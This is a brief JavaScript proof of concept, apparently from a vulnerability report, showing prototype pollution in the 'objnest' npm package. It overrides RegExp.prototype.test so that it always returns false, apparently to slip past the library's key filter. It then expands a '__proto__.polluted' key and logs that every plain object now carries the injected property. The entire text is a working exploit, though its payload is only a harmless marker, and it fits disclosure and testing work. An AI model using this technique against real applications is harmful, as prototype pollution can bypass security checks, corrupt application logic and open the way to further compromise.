RegExp.prototype.test = () => false;
const objnest = require('objnest');
let obj = {};
console.log({}.polluted);
objnest.expand({ '__proto__.polluted': 'yes' });
console.log({}.polluted);